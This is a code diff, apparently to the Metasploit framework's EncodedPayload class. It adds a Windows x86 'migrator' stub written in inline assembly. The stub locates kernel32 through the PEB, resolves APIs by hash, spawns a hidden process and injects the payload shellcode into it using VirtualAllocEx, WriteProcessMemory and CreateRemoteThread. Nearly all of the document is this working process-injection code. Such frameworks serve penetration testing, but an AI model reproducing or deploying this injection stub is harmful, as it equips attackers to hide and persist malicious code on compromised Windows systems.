@@ -88,7 +88,47 @@ class EncodedPayload
 	# raw attribute.
 	#
 	def generate_raw
-		self.raw = (reqs['Prepend'] || '') + pinst.generate + (reqs['Append'] || '')
+		# corelanc0d3r
+		# generate payload, we need the len before calling the optional generate_migrator()
+		
+		generated_payload = pinst.generate
+		generated_payload << (reqs['Append'] || '')
+		
+		# do we need to include a migration stub ?
+		
+		migrate_stub = ''
+		
+		if reqs['Migrate'] and reqs['Migrate'].to_s.downcase == "true"
+
+			# only works on win x86 - this would be a good place to check for architecture
+			
+			# get options
+
+			delay = 0
+			processname = 'cmd'
+
+			if reqs['MigrateOptions']
+				if reqs['MigrateOptions']['Delay']
+					delay = reqs['MigrateOptions']['Delay'] 
+				end
+		
+				if reqs['MigrateOptions']['Process']
+					processname = reqs['MigrateOptions']['Process'] 
+				end	
+			end
+
+			wlog("Creating migrator stub, process #{processname}, delay #{delay}")
+			
+			migrate_stub = generate_migrator('win','x86',generated_payload.length, processname, delay)
+
+			wlog("Migrator stub generated, #{migrate_stub.length} bytes")
+
+		else
+			wlog("No migrator stub selected")
+			
+		end
+		
+		self.raw = (reqs['Prepend'] || '') + migrate_stub + generated_payload
 
 		# If an encapsulation routine was supplied, then we should call it so
 		# that we can get the real raw payload.
@@ -300,6 +340,255 @@ class EncodedPayload
 		end
 
 		return self.nop_sled
+	end
+	
+	
+	# construct a migrator stub if necessary
+	# corelanc0d3r
+	def generate_migrator(platform, architecture, payloadlen, processname, delay)
+	
+		migrate = ''
+	
+		if platform.downcase == 'win' and architecture.downcase == 'x86'
+	
+			payloadsize = "0x%04x" % payloadlen
+		
+			procname = processname || 'cmd'
+		
+			delayval = delay || 3
+		
+			delayvalue = "0x%04x" % (delayval * 1000)
+	
+			migrate_asm = <<EOS
+add esp,-400                  ; adjust the stack to avoid corruption
+push esi
+xor ecx,ecx                   ; ECX = 0
+mov esi, fs:[ecx + 0x30]      ; ESI = &(PEB) ([FS:0x30])
+mov esi, [esi + 0x0c]         ; ESI = PEB->Ldr
+mov esi, [esi + 0x1C]         ; ESI = PEB->Ldr.InInitOrder
+next_module:
+mov ebp, [esi + 0x08]         ; EBP = InInitOrder[X].base_address
+mov edi, [esi + 0x20]         ; EBP = InInitOrder[X].module_name (unicode)
+mov esi, [esi]                ; ESI = InInitOrder[X].flink (next module)
+cmp [edi + 12*2], cl          ; modulename[12] == 0 ?
+jne next_module               ; No: try next module.
+pop esi
+
+mov edx,ebp                   ; save base of kernel32 in edx
+
+jmp main_routine
+
+; find function pointer
+find_function:
+pushad                        ;save all registers
+mov ebp, [esp + 0x24]         ;base address of module that is being loaded in ebp
+mov eax, [ebp + 0x3c]         ;skip over MSDOS header
+mov edx, [ebp + eax + 0x78]   ;go to export table and put RVA in edx
+add edx, ebp                  ;add base address to it.
+mov ecx, [edx + 0x18]         ;set up counter ECX (how many exported items are in array ?)
+
+mov ebx, [edx + 0x20]         ;put names table relative offset in ebx
+add ebx, ebp                  ;add base address to it (ebx = absolute address of names table)
+
+;(should never happen)
+;unless function could not be found
+find_function_loop:
+jecxz find_function_finished  ;if ecx=0, then last symbol has been checked.
+
+dec ecx                       ;ecx=ecx-1
+;with the current symbol
+;and store offset in esi
+mov esi, [ebx + ecx * 4]      ;get relative offset of the name associated
+add esi, ebp                  ;add base address (esi = absolute address of current symbol)
+
+compute_hash:
+xor edi, edi                  ;zero out edi
+xor eax, eax                  ;zero out eax
+cld                           ;clear direction flag.
+
+compute_hash_again:
+lodsb                         ;load bytes at esi (current symbol name) into al, + increment esi
+test al, al                   ;end of string ?
+jz compute_hash_finished      ;yes
+ror edi, 0xd                  ;no, rotate value of hash 13 bits to the right
+add edi, eax                  ;add current character of symbol name to hash accumulator
+jmp compute_hash_again        ;continue loop
+
+compute_hash_finished:
+
+find_function_compare:
+cmp edi, [esp + 0x28]         ;see if computed hash matches requested hash (at esp+0x28)
+jnz find_function_loop        ;no match, go to next symbol
+mov ebx, [edx + 0x24]         ;if match : extract ordinals table (relative offset and put in ebx)
+add ebx, ebp                  ;add base address (ebx = absolute address of ordinals address table)
+mov  cx, [ebx + 2 * ecx]      ;get current symbol ordinal number (2 bytes)
+mov ebx, [edx  +  0x1c]       ;get address table relative and put in ebx
+add ebx, ebp                  ;add base address (ebx = absolute address of address table)
+mov eax, [ebx + 4 * ecx]      ;get relative function offset from its ordinal and put in eax
+add eax, ebp                  ;add base address (eax = absolute address of function address)
+mov [esp + 0x1c], eax         ;overwrite stack copy of eax so popad (return func addr in eax)
+
+find_function_finished:       ;retrieve original registers (eax will contain function address)
+popad
+ret 
+
+;--------------------------------------------------------------------------------------
+find_funcs_for_migrator:
+lodsd                         ;load current hash into eax (pointed to by esi)
+push eax                      ;push hash to stack
+push edx                      ;push base address of dll to stack
+call find_function
+mov [edi], eax                ;write function pointer into address at edi
+add esp, 0x08                 ;adjust stack
+add edi, 0x04                 ;increase edi to store next pointer
+cmp esi, ecx                  ;did we process all hashes yet ?
+jne find_funcs_for_migrator        ;get next hash and lookup function pointer
+find_funcs_for_migrator_finished:
+ret
+
+;--------------------------------------------------------------------------------------
+main_routine:
+sub esp,0x1c                  ;allocate space on stack to store function addresses + ptr to string
+mov ebp,esp
+; ebp+4	 : GetStartupInfo
+; ebp+8  : CreateProcess
+; ebp+C  : VirtualAllocEx
+; ebp+10 : WriteProcessMemory
+; ebp+14 : CreateRemoteThread
+; ebp+18 : Sleep
+; ebp+1c : ptr to command
+
+jmp get_func_hash
+get_func_hash_return:
+
+pop esi                       ;get pointer to hashes into esi
+;edi will be increased with 0x04 for each hash
+lea edi, [ebp+0x4]            ;we will store the function addresses at edi
+
+mov ecx,esi
+add ecx,0x18
+call find_funcs_for_migrator       ;get function pointers for all hashes
+
+; get our own startupinfo at esp+0x60
+; ebp+4 = GetStartupInfo
+mov edx,esp
+add edx,0x60
+push edx
+call [ebp+0x4]
+
+; patch it
+mov [eax+0x2c],1             ; dwFLags : STARTF_USESHOWWINDOW (0x1)
+mov [eax+0x30],0             ; wShowWindow : SW_HIDE (0x0)
+
+; ptr to startupinfo is in eax
+; pointer to string is in ecx
+; ebp+8 = CreateProcessA
+
+; create the process
+mov edi,eax
+add edi,48
+push edi                      ; lpProcessInformation : write processinfo here
+push eax                      ; lpStartupInfo : current info (read)
+xor ebx,ebx
+push ebx                      ; lpCurrentDirectory
+push ebx                      ; lpEnvironment
+push 0x08000000               ; dwCreationFlags CREATE_NO_WINDOW
+push ebx                      ; bInHeritHandles
+push ebx
+push ebx
+push esi                      ; ptr to command
+push ebx
+call [ebp+0x8]
+
+; sleep
+push #{delayvalue}            
+call [ebp+0x18]
+
+; allocate memory in the process (VirtualAllocEx())
+; get handle
+mov ecx,[edi]
+push 0x40                     ; RWX
+add bh,0x10
+push ebx                      ; MEM_COMMIT
+push ebx                      ; size
+xor ebx,ebx
+push ebx                      ; address
+push ecx                      ; handle
+call [ebp+0xc]
+
+; eax now contains the destination
+; WriteProcessMemory()
+push ebp                      ; lpNumberOfBytesWritten 
+push #{payloadsize}           ; nSize 
+; pick up pointer to shellcode & keep it on stack
+call begin_of_payload
+begin_of_payload_return:
+pop edx
+pop ecx
+push edx                      ; lpBuffer 
+push eax                      ; lpBaseAddress 
+mov ecx,[edi]                 ; pick up handle again
+push ecx                      ; hProcess 
+call [ebp+0x10]
+
+; run the code (CreateRemoteThread())
+mov ecx,[edi]                 ; pick up handle again
+xor ebx,ebx
+push ebx                      ; lpthreadID
+push ebx                      ; run immediately
+push ebx                      ; no parameter
+mov ebx,[esp-0x4]
+push ebx                      ; shellcode
+xor ebx,ebx
+add bh,0x20
+push ebx                      ; stacksize
+xor ebx,ebx
+push ebx                      ; lpThreadAttributes
+push ecx
+call [ebp+0x14]               ; run staged shellcode
+
+;sleep
+push -1
+call [ebp+0x18]
+
+get_func_hash:
+call get_func_hash_return
+db 0xD7                       ;GetStartupInfoA
+db 0xE3
+db 0x7A
+db 0x86
+db 0x72                       ;CreateProcessA
+db 0xfe
+db 0xb3
+db 0x16
+db 0x9c                       ;VirtualAllocEx
+db 0x95
+db 0x1a
+db 0x6e
+db 0xa1                       ;WriteProcessMemory
+db 0x6a
+db 0x3d
+db 0xd8
+db 0xdd                       ;CreateRemoteThread
+db 0x9c
+db 0xbd
+db 0x72                       ;Sleep
+db 0xB0
+db 0x49
+db 0x2D
+db 0xDB
+db "#{procname}"
+db 0x00
+begin_of_payload:
+call begin_of_payload_return
+EOS
+
+			migrate = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
+											
+		end
+	
+		return migrate
+		
 	end
 
 
